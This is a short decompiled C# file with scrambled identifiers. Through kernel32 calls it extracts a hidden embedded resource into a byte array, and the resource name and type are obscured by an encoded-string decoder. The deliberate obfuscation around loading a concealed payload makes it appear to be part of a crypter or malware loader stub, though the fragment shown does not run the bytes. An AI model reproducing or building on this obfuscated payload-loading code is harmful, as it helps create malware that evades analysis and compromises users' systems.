using System;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

namespace adudule;

[StandardModule]
internal sealed class HEbwVNKVmBWKTrmPRxSXfVBKKJOkrydqpGJMEcrkUDFZ
{
	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string moduleName);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SizeofResource(IntPtr hModule, IntPtr hResInfo);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

	public static byte[] DRZakIDghOVnvlRMNLQBIPfHGWMPGfInkTHcSJXhQQDD(string gdBkuBwJZavxHeMpFlrLTJojjinYRYDdPfildCfKtpey)
	{
		IntPtr moduleHandleA = GetModuleHandleA(ref gdBkuBwJZavxHeMpFlrLTJojjinYRYDdPfildCfKtpey);
		IntPtr hResInfo = FindResource(moduleHandleA, EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("22|70|"), EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("22|104|106|117|104|89|90|87|106|87|"));
		IntPtr source = LoadResource(moduleHandleA, hResInfo);
		int num = SizeofResource(moduleHandleA, hResInfo);
		byte[] array = new byte[checked(num - 1 + 1)];
		Marshal.Copy(source, array, 0, num);
		return array;
	}
}
